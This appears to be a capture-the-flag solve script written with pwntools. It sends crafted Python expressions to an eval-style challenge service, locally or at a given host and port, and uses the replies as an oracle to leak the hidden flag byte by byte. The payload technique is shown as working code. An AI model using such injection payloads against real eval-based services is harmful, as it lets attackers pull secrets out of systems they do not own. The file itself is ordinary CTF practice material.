#!/usr/bin/env python3

from pwn import log, process, remote, sys


def get_process():
    if len(sys.argv) == 1:
        return process(['python3', 'src/challenge.py'])

    host, port = sys.argv[1].split(':')
    return remote(host, int(port))


def main():
    p = get_process()

    flag = []
    flag_progress = log.progress('Flag')

    while ord('}') not in flag:
        for b in range(0x20, 0x7f):
            p.sendlineafter(b'Input : ', f'(1)if(({b})is(type(flag.split())(flag.encode()).pop({len(flag)})))else()'.encode())
            p.recvline()

            if b'int' in p.recvline():
                flag.append(b)
                flag_progress.status(''.join(map(chr, flag)))
                break

    flag_progress.success(''.join(map(chr, flag)))


if __name__ == '__main__':
    main()